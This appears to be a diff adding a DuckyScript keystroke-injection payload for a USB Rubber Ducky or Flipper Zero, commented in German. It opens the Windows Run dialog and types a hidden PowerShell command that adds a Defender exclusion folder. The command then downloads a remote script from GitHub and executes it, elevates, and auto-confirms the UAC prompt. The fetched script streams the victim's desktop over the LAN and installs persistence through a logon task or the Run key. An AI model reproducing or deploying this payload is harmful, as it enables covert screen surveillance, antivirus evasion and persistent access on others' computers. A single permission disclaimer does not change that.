@@ -1,0 +1,112 @@
+REM ============================================================================
+REM  Screenshare over LAN (recon) - USB Rubber Ducky / Flipper Zero
+REM  DuckyScript 3.0
+REM
+REM  Startet auf dem Ziel-Windows einen HTTP-Server, der den Desktop als
+REM  PNG-Stream ausliefert (multipart/x-mixed-replace, ca. 30 fps):
+REM
+REM        http://<LAN-IP des Ziels>:8080/
+REM
+REM  Payload: eigene, gepatchte Kopie des offiziellen Hak5-payloads
+REM  (view-only, KEINE Maus-/Tastatureingabe)
+REM  https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/refs/heads/main
+REM  /Screenshare-Over-LAN-fixed.ps1
+REM
+REM  Voraussetzungen am Ziel:
+REM    * interaktive, angemeldete Desktop-Sitzung (kein Lock-Screen)
+REM    * Internetzugang (GitHub Raw wird abgerufen)
+REM    * Administratorrechte (Firewall-Regel + HttpListener-URL-Reservation)
+REM    * Beenden: ESC auf dem Ziel 5 Sekunden lang gedrueckt halten
+REM
+REM  NUR auf Systemen einsetzen, die dir gehoeren bzw. fuer die du eine
+REM  ausdrueckliche Erlaubnis hast.
+REM ============================================================================
+
+REM ----------------------------- Konfiguration -------------------------------
+DEFINE #SCRIPTURL https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/main/Screenshare-Over-LAN-fixed.ps1
+DEFINE #PORT 8080
+
+REM -------------------------- Windows-Erkennung -----------------------------
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+END_EXTENSION
+
+IF $_OS != WINDOWS
+    LED_R
+    STOP_PAYLOAD
+END_IF
+
+REM ----------------------- Payload starten (elevated) -----------------------
+REM  WICHTIG - 259-Zeichen-Limit:
+REM  Das Eingabefeld des Windows-Run-Dialogs fasst hoechstens 259 Zeichen.
+REM  Alles, was danach kommt, wird kommentarlos abgeschnitten - der Befehl
+REM  laeuft dann unvollstaendig (z. B. mit abgeschnittener URL) und scheitert.
+REM  Ein Aufteilen in mehrere STRING-Bloecke hilft NICHT, weil sich die
+REM  Zeichen aller Bloecke im selben Eingabefeld addieren.
+REM  Der Befehl unten hat 227 Zeichen (Reserve: 32) und bleibt deshalb in
+REM  EINEM STRING-Block.
+REM
+REM  1) md C:\PS -Force      -> Arbeitsordner anlegen
+REM  2) Add-MpPreference     -> Defender/AMSI-Ausnahme NUR fuer diesen Ordner
+REM  3) irm ... -OutFile     -> Payload herunterladen ('irm | iex' faellt bei
+REM                              Defender stark auf)
+REM  4) & C:\PS\x.ps1        -> aus dem ausgenommenen Ordner starten
+REM  Das ps1 richtet Firewall, HTTP-URL-Reservierung und IP-Erkennung selbst ein.
+REM
+REM  AUTOSTART: Das ps1 legt beim Start automatisch einen Autostart an -
+REM  zuerst ein Task im Task-Planer (Trigger 'Bei Anmeldung', mit hoechsten
+REM  Rechten, damit beim Anmelden keine UAC-Abfrage kommt und der Task in der
+REM  interaktiven Sitzung laeuft - ein 'Bei Systemstart'-Task laeuft in Session 0
+REM  und wuerde einen schwarzen Screenshot liefern). Falls der Task-Planer nicht
+REM  zur Verfuegung steht, greift HKCU\...\Run.
+REM  Entfernen: powershell -ExecutionPolicy Bypass -File <pfad>\x.ps1 -RemoveAutostart
+REM
+REM  Hinweis: nur einfache Anfuehrungszeichen ('...') verwenden - doppelte
+REM  Anfuehrungszeichen ueberleben die Argument-Umleitung des Run-Dialogs nicht.
+REM
+REM  Das geladene ps1 (Screenshare-Over-LAN-fixed.ps1) ist die gepatchte
+REM  Fassung des offiziellen Hak5-payloads. Unterschiede:
+REM    * IP-Erkennung ueber die Standardroute statt Regex 'Wi*' / 'Eth*'
+REM      -> funktioniert auch bei mehreren Adaptern (VPN, VMs, 'Ethernet 2')
+REM    * Firewall-Regel 'AllowWebServer' wird vor dem Anlegen bereinigt
+REM      -> zweiter Start bricht nicht mit einem Duplikat-Fehler ab
+REM    * Fallback auf http://+:PORT/ falls keine IP ermittelt werden kann
+REM
+REM  Rueckfall auf das offizielle, ungepatchte Payload (funktioniert auf
+REM  Rechnern mit genau einem Ethernet-/Wi-Fi-Adapter):
+REM  DEFINE #SCRIPTURL https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/refs/heads/master/payloads/library/recon/Screenshare-Over-LAN/Screenshare-Over-LAN.ps1
+
+LED_G
+GUI r
+DELAY 1200
+
+STRING powershell -ExecutionPolicy Bypass -w h -c md C:\PS -Force;Add-MpPreference -ExclusionPath 'C:\PS';irm #SCRIPTURL -OutFile C:\PS\x.ps1;& C:\PS\x.ps1
+DELAY 800
+
+REM  Run-Dialog mit Administratorrechten starten (Windows-Sonderkuerzel)
+CTRL-SHIFT ENTER
+DELAY 3000
+
+REM  UAC bestaetigen: LEFT springt auf den linken Button ('Ja'/'Yes'),
+REM  ENTER bestaetigt. Damit ist es locale-unabhaengig.
+LEFT
+DELAY 300
+ENTER
